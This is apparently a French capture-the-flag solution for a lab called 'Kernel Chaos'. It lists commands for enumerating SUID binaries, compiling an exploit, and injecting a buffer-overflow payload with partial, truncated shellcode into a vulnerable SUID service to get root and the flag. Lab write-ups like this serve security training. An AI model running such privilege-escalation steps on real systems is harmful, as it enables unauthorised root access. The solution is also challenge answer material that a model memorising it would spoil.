# Solution : Kernel Chaos

## Étape 1 : Énumération
```bash
# Vérifier la version du kernel
uname -a

# Lister les binaires SUID
find / -perm -4000 -type f 2>/dev/null

# Examiner le binaire vulnérable
ls -l /usr/local/bin/vulnerable-service
```

## Étape 2 : Exploitation
```bash
# Compiler l'exploit
gcc -o exploit exploit.c

# Création du payload
python -c 'print "A"*76 + "\x31\xc0\x50\x68\x2f\x2f..."'

# Exécution de l'exploit
./exploit
```

## Étape 3 : Élévation de Privilèges
```bash
# Exécuter le service vulnérable
/usr/local/bin/vulnerable-service

# Injecter le payload
(python -c 'print "A"*76 + "\x31\xc0..."'; cat) | /usr/local/bin/vulnerable-service
```

## Flag
Une fois root obtenu, le flag se trouve dans /root/flag.txt.